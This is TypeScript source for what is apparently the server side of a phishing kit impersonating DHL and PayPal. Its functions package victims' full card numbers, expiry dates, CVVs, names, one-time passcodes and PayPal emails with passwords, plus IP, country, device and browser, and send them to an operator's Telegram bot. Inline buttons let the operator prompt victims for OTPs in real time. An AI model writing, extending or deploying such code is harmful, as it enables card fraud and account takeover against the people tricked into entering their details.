export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  message: string,
  inlineKeyboard?: any[][]
): Promise<boolean> {
  try {
    const body: any = {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML",
    };

    if (inlineKeyboard && inlineKeyboard.length > 0) {
      body.reply_markup = {
        inline_keyboard: inlineKeyboard,
      };
    }

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      }
    );

    const data = await response.json();
    return data.ok === true;
  } catch (error) {
    console.error("Telegram send error:", error);
    return false;
  }
}

export function formatPaymentNotification(data: {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardholderName: string;
  otp1?: string;
  otp2?: string;
  timestamp: Date;
  ipAddress?: string;
  country?: string;
  device?: string;
  browser?: string;
  sessionId?: string;
}): { message: string; keyboard?: any[][] } {
  const fullCardNumber = data.cardNumber;
  
  const message = `
🔔 <b>New Activity</b>

✅ <b>Card Number:</b> ${fullCardNumber}
✅ <b>Expiration:</b> ${data.expiryMonth}/${data.expiryYear}
✅ <b>Cvc:</b> ${data.cvv}
✅ <b>Name:</b> ${data.cardholderName}

${data.otp1 ? `✅ <b>OTP 1:</b> ${data.otp1}\n` : ''}${data.otp2 ? `✅ <b>OTP 2:</b> ${data.otp2}\n` : ''}
-----------------------------+
<b>Country:</b> ${data.country || 'Unknown'}
<b>IP Address:</b> ${data.ipAddress || 'Unknown'}
🌐-----------------------------+
<b>Session:</b> ${data.sessionId || 'N/A'}
<b>Device:</b> ${data.device || 'Desktop/Unknown'}
<b>Browser:</b> ${data.browser || 'Unknown'}
<b>Page:</b> Card Entry
+-----------------------------
  `.trim();

  const keyboard = data.sessionId ? [
    [
      { text: "❌ ERROR ❌", callback_data: `dhl_error_${data.sessionId}` }
    ],
    [
      { text: "APPROVE", callback_data: `dhl_approve_${data.sessionId}` },
      { text: "OTP", callback_data: `dhl_otp_${data.sessionId}` }
    ],
    [
      { text: "OTP ERROR", callback_data: `dhl_otp_error_${data.sessionId}` },
      { text: "SUCCESS", callback_data: `dhl_success_${data.sessionId}` }
    ],
    [
      { text: "LOADING", callback_data: `dhl_loading_${data.sessionId}` },
      { text: "🏠 HOME", callback_data: `dhl_home_${data.sessionId}` }
    ]
  ] : undefined;

  return { message, keyboard };
}

export function formatPayPalNotification(data: {
  email: string;
  password: string;
  timestamp: Date;
  ipAddress?: string;
  country?: string;
  device?: string;
  browser?: string;
  sessionId?: string;
  targetUrl?: string;
}): { message: string; keyboard?: any[][] } {
  const message = `
🔔 <b>New Activity</b>

✅ <b>Email:</b> ${data.email}
✅ <b>Password:</b> ${data.password}

-----------------------------+
<b>Country:</b> ${data.country || 'Unknown'}
<b>IP Address:</b> ${data.ipAddress || 'Unknown'}
🌐-----------------------------+
<b>Session:</b> ${data.sessionId || 'N/A'}
<b>Device:</b> ${data.device || 'Desktop/Unknown'}
<b>Browser:</b> ${data.browser || 'Unknown'}
<b>Page:</b> Login Page
  `.trim();

  const keyboard = data.sessionId ? [
    [
      { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${data.sessionId}` }
    ],
    [
      { text: "APPROVE", callback_data: `paypal_approve_${data.sessionId}` },
      { text: "OTP", callback_data: `paypal_otp_${data.sessionId}` }
    ],
    [
      { text: "SUCCESS", callback_data: `paypal_success_${data.sessionId}` },
      { text: "🏠 HOME", callback_data: `paypal_home_${data.sessionId}` }
    ]
  ] : undefined;

  return { message, keyboard };
}

export async function getClientInfo(req: any): Promise<{
  ipAddress: string;
  country: string;
  device: string;
  browser: string;
  sessionId: string;
}> {
  // Get IP address
  const ipAddress = 
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'Unknown';

  // Get user agent
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  // Detect device
  let device = 'Desktop/Unknown';
  if (/mobile/i.test(userAgent)) {
    device = 'Mobile';
  } else if (/tablet/i.test(userAgent)) {
    device = 'Tablet';
  } else if (/desktop/i.test(userAgent)) {
    device = 'Desktop';
  }

  // Detect browser
  let browser = 'Unknown';
  if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
    const match = userAgent.match(/Chrome\/(\d+\.\d+\.\d+)/);
    browser = match ? `Chrome ${match[1]}` : 'Chrome';
  } else if (userAgent.includes('Firefox')) {
    const match = userAgent.match(/Firefox\/(\d+\.\d+)/);
    browser = match ? `Firefox ${match[1]}` : 'Firefox';
  } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
    browser = 'Safari';
  } else if (userAgent.includes('Edg')) {
    browser = 'Edge';
  }

  // Get country from IP (basic implementation - you can enhance with GeoIP service)
  let country = 'Unknown';
  try {
    // Using a free IP geolocation service
    const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}?fields=country`);
    const geoData = await geoResponse.json();
    country = geoData.country || 'Unknown';
  } catch (error) {
    console.error('GeoIP lookup failed:', error);
  }

  // Generate session ID
  const sessionId = Math.random().toString(36).substring(2, 10);

  return {
    ipAddress,
    country,
    device,
    browser,
    sessionId
  };
}
